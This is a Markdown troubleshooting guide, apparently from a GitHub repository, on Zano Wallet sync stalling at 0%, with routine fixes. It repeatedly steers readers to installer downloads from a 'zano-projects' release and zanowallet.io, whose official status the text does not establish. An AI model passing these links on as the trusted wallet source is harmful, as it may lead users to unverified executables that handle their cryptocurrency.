<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/03-download.webp" alt="Zano Wallet - Zano Wallet Sync Stuck at 0% or Not Moving" width="100%"></p>

<h1 align="center">Zano Wallet Sync Stuck at 0% or Not Moving</h1>

<p align="center">
<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
</p>

---

**Short answer:** Update to the latest Zano Wallet, check your internet and firewall, and give the first sync time; a stuck bar usually means no peers or an outdated build.

## You'll see this if

- The sync bar stays at 0.00%
- Progress stops at the same block for hours

## Why it happens

The wallet must connect to other nodes and download every block. Old versions, blocked ports, VPNs and sleeping computers all stall that process.

## How to fix it

1. Install the latest release; older builds can lose compatibility with the network.
2. Allow Zano Wallet through your firewall when asked.
3. Pause VPN or proxy software and restart the wallet.
4. Stop the computer from sleeping during the first sync.
5. Leave it running; the first full sync can take hours.

Related reading: [Zano Wallet Filling Up Your Drive: Free Space Safely](./zano-wallet-disk-space-full.md) and the [Zano Wallet troubleshooting FAQ](https://zanowallet.io/faq/).

## If that didn't work

If it is still stuck, close the wallet, move the blockchain data folder aside (not your wallet file) and let it sync from scratch. You can also read [Zano Wallet Shows a Zero Balance](./zano-wallet-balance-zero.md).

## Prevent it next time

Keep the app updated and leave enough free disk space, so the database never stops mid-write. More on the website: [get the latest Zano Wallet](https://zanowallet.io/download/).

## FAQ

**Is my money at risk while syncing?**  
No. Your coins live on the blockchain; sync only updates your local view.

**Why is my balance zero?**  
Balances appear only after the wallet reaches the current block.

---

## The fix in one step: install the latest Zano Wallet

The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):

[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)

| Platform | File | Version |
|---|---|---|
| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |

> [!TIP]
> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.

## Related guides

| Guide | On the website |
|---|---|
| [Zano Wallet Filling Up Your Drive: Free Space Safely](./zano-wallet-disk-space-full.md) | [Zano Wallet troubleshooting FAQ](https://zanowallet.io/faq/) |
| [Zano Wallet Shows a Zero Balance](./zano-wallet-balance-zero.md) | [get the latest Zano Wallet](https://zanowallet.io/download/) |
| [How to Update Zano Wallet to the Latest Version](./update-zano-wallet.md) | [how the Zano blockchain works](https://zanowallet.io/guides/about-zano-blockchain/) |

---

<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
